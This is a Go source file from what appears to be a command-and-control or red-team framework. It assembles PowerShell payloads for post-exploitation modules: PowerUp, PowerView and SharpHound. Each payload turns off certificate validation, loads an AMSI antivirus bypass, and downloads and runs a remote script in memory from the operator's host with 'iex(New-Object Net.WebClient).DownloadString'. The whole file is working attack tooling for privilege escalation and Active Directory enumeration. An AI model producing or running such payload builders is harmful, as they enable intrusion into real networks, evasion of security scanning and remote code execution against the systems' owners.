package injection

import (
	"MoP/src/config"
	"MoP/src/middlewares"
	"fmt"
)

var (
	CertificateBypass = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; "
)

func HandleModules(command string) string {
	slicedCommand := middlewares.SliceCommand(command)
	module := slicedCommand[1]
	var payload string

	switch module {
	case "PowerUp":
		payload += CertificateBypass + amsi() + "; " + powerUp()
		return payload
	case "PowerView":
		payload += CertificateBypass + amsi() + "; " + domainEnum("PowerView")
		return payload
	case "PowerView_dev":
		payload += CertificateBypass + amsi() + "; " + domainEnum("PowerView_dev")
		return payload
	case "PowerView_2022":
		payload += CertificateBypass + amsi() + "; " + domainEnum("PowerView_2022")
		return payload
	case "SharpHound":
		payload += CertificateBypass + amsi() + "; " + domainEnum("SharpHound")
		return payload
	default:
		//
	}
	return ""
}

func amsi() string {
	url := iex("bypass/amsi.ps1")
	return url
}

func domainEnum(payload string) string {
	url := iex(fmt.Sprintf("Domain_Enum/%s.ps1", payload))
	return url
}

func powerUp() string {
	url := iex("Local_PrivEsc/PowerUp.ps1")
	return url
}

func iex(payload string) string {
	url := "iex(New-Object Net.WebClient).DownloadString(\"" + config.Load().Hostname + "/drop/win/" + payload + "\") "
	return url
}
